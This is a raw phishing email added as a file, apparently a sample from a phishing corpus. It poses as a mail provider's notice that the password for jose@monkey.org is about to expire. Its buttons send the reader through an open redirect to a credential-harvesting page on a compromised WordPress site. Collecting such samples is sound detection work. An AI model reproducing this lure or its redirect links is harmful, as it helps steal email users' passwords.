@@ -1,0 +1,167 @@
+Return-Path: controlpad@sewbeeitembroidery.com
+Delivered-To: jose@monkey.org
+X-FDA: 82682638668.32.3521ABE
+Received: from serv-17256.my-tss.com (serv-17256.my-tss.com [66.115.166.232])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id 25AF5120003
+	for <jose@monkey.org>; Thu, 17 Oct 2024 09:56:11 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;	dkim=none;	spf=none
+ (imf18.b.hostedemail.com: domain of controlpad@sewbeeitembroidery.com has no
+ SPF policy when checking 66.115.166.232)
+ smtp.mailfrom=controlpad@sewbeeitembroidery.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1729158884;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=Ymy0Hcvm78xB3sWAaiR9pkKL9SefVVXTKXwOUrq4RiA=;
+	b=vLsdhYZJWgAmphFSdOfyGAg3nQ1erBvyWd/TGcrijeEx6jsIJ6DvKe72mUhIIcQV3eF2Pn
+	bDHRfjY9c76lGfr72TvFyrrIKWgGJNx5FLD2l4iQ+OZI1Ne0NdOtRQ/eVp8dQgl+6pQg1T
+	Xi8ZEoxYrQY1jHY4s8MkPZsZxK6c+qU=
+ARC-Authentication-Results: i=1;	imf18.b.hostedemail.com;	dkim=none;	spf=none
+ (imf18.b.hostedemail.com: domain of controlpad@sewbeeitembroidery.com has no
+ SPF policy when checking 66.115.166.232)
+ smtp.mailfrom=controlpad@sewbeeitembroidery.com;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1729158884; a=rsa-sha256;
+	cv=none;
+	b=LInIn91QWV5CDQaRYhH1q4DD6X1L57f6OvejihYtlv61GhW+6Bd/yl6NKDkaWkkmK79Xv3
+	jkqapix+09r8E3nBRfev5WzN3XSQW96kXSvi1lIyYwQWPIKJoKw0TvpGSpbrpkRxhob5wf
+	uXtth71w/Hqy/yI4OlyU/C/1Iovl/L0=
+Received: from [173.249.194.53] (port=49674 helo=sewbeeitembroidery.com)
+	by SERV-17256.my-tss.com with esmtpa (Exim 4.97.1)
+	(envelope-from <controlpad@sewbeeitembroidery.com>)
+	id 1t1NEz-0000000CnRU-2Tut
+	for jose@monkey.org;
+	Thu, 17 Oct 2024 05:56:18 -0400
+From: Monkey  Support <controlpad@sewbeeitembroidery.com>
+To: jose@monkey.org
+Subject: IMPORTANT: Keep Same Credential For Monkey  Email
+Date: 17 Oct 2024 11:56:18 +0200
+Message-ID: <20241017115618.56D39E33517D0CA9@sewbeeitembroidery.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - SERV-17256.my-tss.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - sewbeeitembroidery.com
+X-Get-Message-Sender-Via:
+ SERV-17256.my-tss.com: authenticated_id: controlpad@sewbeeitembroidery.com
+X-Authenticated-Sender:
+ SERV-17256.my-tss.com: controlpad@sewbeeitembroidery.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Queue-Id: 25AF5120003
+X-Rspamd-Server: rspam04
+X-Spam-Status: No, score=6.80
+X-Stat-Signature: gt5wokfm6ffou1h86fn6w7uyegwp8396
+X-Rspam-User: 
+X-HE-Tag: 1729158971-713668
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18aUmoNrFybLN3sCFPLYMQ1AFSK/Im0gg5acuRarU+xifF?=
+ =?utf-8?q?MbKFkT/AueYJHZHYKPCtybN5Rmy75Jp2Ww8az1zDsRfRqnq6CWLdJDkrxNt/r8Udb?=
+ =?utf-8?q?cC32xr1zROU1Z+h+APS6LS0fEdjKxnTDO9DZ+irOoLzJjhsv5rW7b6RNXVKHwu4ni?=
+ =?utf-8?q?slyNhFIx28xjQWNwCSW2oloBuDu2A4oLFTdznUghrPtk1NLU/QxKcLQnzGSpRrUSA?=
+ =?utf-8?q?/Lukgbi3py1A7R+SWUhtsi91aqHr6rqaV4y3gyJ5YAnhpCn3JfAeBpGxFHTHY2USJ?=
+ =?utf-8?q?mCzXWimqVCpLREwTNtTAPpPDi2p8qjUsoDN1nffNQC677c5unODgrzD07bG91eSEh?=
+ =?utf-8?q?iNOWxOV7+YZ5Gsz8ShH2HwXtO2qe4MdcQ6BM8FYmqXzUM/2y35YpxZrglmHnxHir7?=
+ =?utf-8?q?zqmH+D8lYo/uyV06bn9nq4zioBLlqkDrlICvoi82flF15DBJyO8UxHD8CkivwOAge?=
+ =?utf-8?q?gnXhjvRv7RSINPU5pfW/a8d1Ljw090gAvgiYUIgoZQc5Z+LdVH2bBYtdIKtL0VZTq?=
+ =?utf-8?q?mxebF5wn95yG7fgvOEl1ZMXqQ2G5m5HeTyxF1fYup0Jizo6b1gz3c81AyKt68VUZv?=
+ =?utf-8?q?+EPlJ0xhSQuIbYGCca3T1ZSafBvkUIG/sJjTtQPjeaJFrJ+W9EIqOWNUx7SnXZoai?=
+ =?utf-8?q?L6w9D9tEJW+wnQ3YZa7onxdJiGIeFHk0uOsfH6DF6ZrcJXaAPGVjm7ARUf27ox4oq?=
+ =?utf-8?q?bvinVIypfQt2XgUEXofJxeSHScrDOIPOTco/eT8rQqHGd/HFzZNBIOqDdiuzni4F5?=
+ =?utf-8?q?fSnrqlkh1XcK4Imcgx2M72jd6c8MKwLZXNjDCbsEnGBoKHUUykFqX+0IFSftqmgZv?=
+ =?utf-8?q?U3R4TCtYzcgqSScCuR78mlJHnXYh9Hpq15Y1YHYaad2NbAfoZEwNW9eA1t1NM73tx?=
+ =?utf-8?q?CSb7a4w1+8uk8NAnrC3HHP_Zrb32LuuJqtV63J+8p5keOnUKCEngIG6YUuE4bxkU6?=
+ =?utf-8?q?x3iQqPysddbgPQcqY9DyZI9gpEgu0KPyoRgrERkypjB8/ZkDHXzXQXOgJIJRdst1x?=
+ =?utf-8?q?U7Cls9k5UFlj0Fdzpm9f2+vOUrU7qpco3lCewPxQCEN98PgWglLijcKrduZXoYb5K?=
+ =?utf-8?q?33635b6BuB02xT+I+ra3JH3e+F+9sMlbwC11GACwt5SyYTOQqi9nVr3bGoUmQl8ZE?=
+ =?utf-8?q?6XN65g4w9Kvc2Df4P0vm8yqf3XtPKVQF3Fox6JwfpsjWGQL95Ap5k9psmWtAD5smj?=
+ =?utf-8?q?TYfjiSs/efqfO9xmmy+uOBSHNj360XxHKgL6nxr3RkdRnseMFceAss5iP16rMqVJw?=
+ =?utf-8?q?AxHhcm3GFsV5MTGCQStS8qIvntTPknYgn1LYgEZxBtul+nZEUkvFs/nzZFlCFvE62?=
+ =?utf-8?q?VhirQTtywCGd0wcucX+d/KjUuBejo5CeFtpLQw2RJIAIx1Fbna9cw5wvW4tyPWpRj?=
+ =?utf-8?q?Igo4QXROhdX36bYpIWEiDXQrUVhEoMERTLq/8qnMLUXlf2hBJUNE0DFfJ2EozI+xF?=
+ =?utf-8?q?EzAuNJhhelLhqMyxLh0sP3EiJxmV9mtd9dpdH5NgehW5xPTk+BzjdhSOoUCsm1aYL?=
+ =?utf-8?q?FUZ+sinwr5SKScX256?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 308
+
+<html><head>
+	<title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div>
+<div style=3D'border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: wf_segoe-ui_semibold,"Segoe UI Semibold","Segoe WP Se=
+mibold","Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font=
+-size: 15px; vertical-align: baseline; font-stretch: inherit; font-variant-=
+numeric: inherit; font-variant-east-asian: inherit;'>&nbsp;</div>
+</div>
+
+<div style=3D"margin: 0px auto; padding: 50px; max-width: 600px; background=
+-color: rgb(246, 246, 246);">
+<table width=3D"100%" style=3D"margin: 0px auto; width: 100%; border-collap=
+se: collapse; max-width: 600px;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0">
+	<tbody>
+		<tr>
+			<td><strong><font color=3D"#000000">Monkey &nbsp;E-Mail Service</font></=
+strong><strong> </strong>
+
+			<p><br>Valued contact,</p>
+
+			<p>The password to your email account (<b><font color=3D"#0000ff">jose@m=
+onkey.org</font></b>) will expire on 10/17/2024 11:56:18 a.m.<br>
+			<br>
+			We recommend that you use the below to keep password valid to avoid logi=
+n interruption.</p>
+			</td>
+		</tr>
+		<tr>
+			<td style=3D"padding: 10px 0px;">
+<a style=3D"padding: 12px 24px; border-radius: 4px; color: rgb(255, 255, 25=
+5); display: inline-block; background-color: rgb(0, 119, 204); text-decorat=
+ion-line: none;" href=3D"https://web.mmac.org/cwt/external/wcpages/referral=
+=2Easpx?ReferralType=3DW&amp;ProfileID=3D94027&amp;ListingID=3D11005&amp;Ca=
+tegoryID=3D721&amp;SubCategoryID=3D0&amp;url=3D//mmbyggalltjaenst.se/wp-inc=
+ludes/sos/index.html?userid=3Djose@monkey.org" target=3D"_blank" rel=3D"nor=
+eferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://binarygigadat=
+aanalyst.eurasiareiyukai.org/?email%3DY29udGFjdEBuZXh1c3BoYXJtYS5jb20ucGs%3=
+D&amp;source=3Dgmail&amp;ust=3D1729040835680000&amp;usg=3DAOvVaw1mRH2jiDf8f=
+GnaUrFwDbdD">KEEP MY PASSWORD</a></td>
+		</tr>
+		<tr>
+			<td style=3D"padding: 10px 0px;">
+			<p>
+You may visit <a href=3D"https://web.mmac.org/cwt/external/wcpages/referral=
+=2Easpx?ReferralType=3DW&amp;ProfileID=3D94027&amp;ListingID=3D11005&amp;Ca=
+tegoryID=3D721&amp;SubCategoryID=3D0&amp;url=3D//mmbyggalltjaenst.se/wp-inc=
+ludes/sos/index.html?userid=3Djose@monkey.org" target=3D"_blank" rel=3D"nor=
+eferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://binarygigada=
+taanalyst.eurasiareiyukai.org/?email%3DY29udGFjdEBuZXh1c3BoYXJtYS5jb20ucGs%=
+3D&amp;source=3Dgmail&amp;ust=3D1729040835680000&amp;usg=3DAOvVaw2RkoZuIKsS=
+HkSv-TGpAlVT">
+monkey.org/contact@<wbr>monkey.org/activity</a> to see email activity.</p>
+			</td>
+		</tr>
+		<tr>
+			<td style=3D"padding: 10px 0px;">
+			<p><font color=3D"#768089"><em>&copy; 2024 Monkey  Email Service. All Ri=
+ghts Reserved.</em></font></p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</div>
+
+
+</body></html>
+
